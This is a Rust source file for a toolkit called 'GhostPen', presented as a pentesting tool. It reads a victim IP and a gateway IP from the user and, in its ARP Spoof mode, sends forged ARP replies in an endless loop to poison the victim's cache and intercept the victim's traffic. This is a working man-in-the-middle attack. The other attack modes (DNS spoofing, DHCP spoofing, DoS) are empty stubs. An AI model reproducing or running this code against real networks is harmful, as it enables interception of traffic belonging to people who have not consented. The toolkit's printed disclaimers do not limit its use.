mod mode;
mod mac;
use mode::select_mode;
use colored::Colorize;
use pnet::datalink::{
    self,
    Channel::Ethernet,
    MacAddr
};
use pnet::packet::arp::{
    ArpHardwareTypes,
    ArpOperations,
    MutableArpPacket,
};
use pnet::packet::ethernet::{
    EtherTypes,
    MutableEthernetPacket
};
use pnet::packet::{
    MutablePacket,
    Packet
};
use std::io::{self, Write};
use std::net::{
    Ipv4Addr, 
    Ipv6Addr
};
use myrustscan::{
    input::{
        PortRange,
        ScanOrder
    },
    port_strategy::PortStrategy,
    scanner::Scanner,
};
use get_if_addrs::get_if_addrs;
use get_if_addrs::Ifv4Addr;
use getifaddrs::getifaddrs;
use ipnet::Ipv4Net;
use std::net::IpAddr;
use tokio_ping::Pinger;
use futures::stream::{FuturesUnordered, StreamExt};
fn main() {
    println!("{}", "Welcome to GhostPen, your pentesting toolkit written in rust.".green().bold());
    let selected_mode = select_mode();

    let warnings = [
        "THIS TOOL IS ONLY FOR PENETRATION TESTING AND NOT FOR ILLEGAL PURPOSES",
        "ABUSE IS GOING TO BE PUNISHED!!! IDK BY WHO...",
    ];
    for warning in warnings.iter() {
        println!("{}", warning.red().bold());
    }
    println!("You have selected {}.", selected_mode.green().bold());

    println!("{}" ,"------------------------\n=======next step:=======\n------------------------\n".yellow().bold());
    println!("{}", "Available interfaces:".green().bold());

    for iface in datalink::interfaces() {
        println!("{}", iface.name.red().bold());
    }
    print!("Interface: ");
    io::stdout().flush().unwrap();
    let mut iface = String::new();
    io::stdin().read_line(&mut iface).unwrap();
    let iface = iface.trim();

    print!("Victim IP: ");
    io::stdout().flush().unwrap();
    let mut victim_ip = String::new();
    io::stdin().read_line(&mut victim_ip).unwrap();
    let victim_ip = victim_ip.trim();
    let victim_ip_addr: Ipv4Addr = victim_ip.parse().unwrap();

    print!("Gateway IP: ");
    io::stdout().flush().unwrap();
    let mut gateway_ip = String::new();
    io::stdin().read_line(&mut gateway_ip).unwrap();
    let gateway_ip = gateway_ip.trim();
    let gateway_ip_addr: Ipv4Addr = gateway_ip.parse().unwrap();

    let attacker_mac = mac_address::mac_address_by_name(iface).unwrap().unwrap().bytes();
    let attacker_mac = MacAddr::new(attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]);

    let victim_mac = mac::find_mac(iface, victim_ip, "Victim").expect("Victim MAC not found. Is the host up?");

    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter().find(|i| i.name == iface).expect("Interface not found");
    let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, _)) => (tx, ()),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Error creating datalink channel: {}", e),
    };

    if selected_mode == "DNS Spoof" {
        loop {
            todo!()
        }
    }

    if selected_mode == "DHCP Spoof" {
        loop {
            todo!()
        }
    }

    if selected_mode == "DoS Attack" {
        loop {
            
        }
    }
    if selected_mode == "Port Scan" {
        loop {
        }
    }

    if selected_mode == "ARP Spoof" {
        loop {
            let mut arp_buffer = [0u8; 28];
            let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);
            arp_packet.set_sender_hw_addr(attacker_mac);
            arp_packet.set_sender_proto_addr(gateway_ip_addr);
            arp_packet.set_target_hw_addr(victim_mac);
            arp_packet.set_target_proto_addr(victim_ip_addr);

            let mut ethernet_buffer = [0u8; 42];
            let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
            ethernet_packet.set_destination(victim_mac);
            ethernet_packet.set_source(attacker_mac);
            ethernet_packet.set_ethertype(EtherTypes::Arp);
            ethernet_packet.set_payload(arp_packet.packet_mut());
            tx.send_to(ethernet_packet.packet(), None);
        }
    }
}
